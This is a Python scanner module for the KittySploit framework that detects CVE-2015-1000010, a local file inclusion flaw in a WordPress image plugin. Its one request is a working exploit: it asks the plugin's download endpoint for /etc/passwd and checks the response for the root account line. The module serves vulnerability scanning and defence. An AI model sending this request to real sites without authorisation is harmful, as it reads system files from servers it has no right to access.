#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Simple Image Manipulator 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Simple Image Manipulator < 1.0 - Local File Inclusion Detection',
        'description': 'WordPress Simple Image Manipulator 1.0 is vulnerable to local file inclusion in ./simple-image-manipulator/controller/download.php because no checks are made to authenticate users or sanitize input when determining file location.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web',
            'scanner',
            'cve',
            'cve2015',
            'packetstorm',
            'wpscan',
            'wordpress',
            'wp-plugin',
            'lfi',
            'wp',
            'simple-image-manipulator_project',
            'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/132962/WordPress-Simple-Image-Manipulator-1.0-File-Download.html',
            'https://wpscan.com/vulnerability/40e84e85-7176-4552-b021-6963d0396543',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-1000010',
            'http://www.vapidlabs.com/advisory.php?v=147',
        ],
        'cve': 'CVE-2015-1000010',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/./simple-image-manipulator/controller/download.php?filepath=/etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="WordPress Simple Image Manipulator < 1.0 - Local File Inclusion detected",
                path='/wp-content/plugins/./simple-image-manipulator/controller/download.php?filepath=/etc/passwd',
            )
            return True
        return False

